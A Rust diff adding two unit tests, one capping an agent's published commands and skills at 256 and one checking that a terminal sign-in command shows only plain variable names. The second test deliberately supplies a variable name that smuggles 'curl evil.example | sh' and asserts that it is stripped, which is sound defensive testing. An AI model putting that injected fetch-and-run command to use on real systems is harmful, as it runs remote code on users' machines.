@@ -62,3 +62,29 @@ fn acp_command_and_auth_metadata_are_bounded_deduplicated_and_secret_safe() {
     assert_eq!(methods.expose()[1].env_var_names.as_ref().unwrap().len(), 1);
     assert!(web_url("file:///private").is_none());
 }
+
+/// Review L7: an agent can publish at most 256 commands and skills.
+#[test]
+fn published_commands_are_capped() {
+    let advertised: Vec<_> = (0..300)
+        .map(|index| json!({"name": format!("command-{index}")}))
+        .chain((0..300).map(|index| json!({"name": format!("$skill-{index}")})))
+        .collect();
+    let published = commands(&advertised);
+    assert_eq!(published.slash_commands.len() + published.skills.len(), 256);
+}
+
+/// Review L8: a terminal sign-in's variable names reach the displayed command only when they
+/// are plain names, so pasting it cannot run what an agent put in a name.
+#[test]
+fn terminal_sign_in_variable_names_are_plain_names() {
+    let methods = auth_methods(
+        &[
+            json!({"id":"terminal","name":"Sign in","type":"terminal","env":{"X=1; curl evil.example | sh; Y":"v","GOOD_NAME":"v"}}),
+        ],
+        Some(("agent", &[])),
+    );
+    let command = methods.expose()[0].command.as_deref().unwrap();
+    assert!(command.contains("GOOD_NAME=v"), "{command}");
+    assert!(!command.contains("curl"), "{command}");
+}
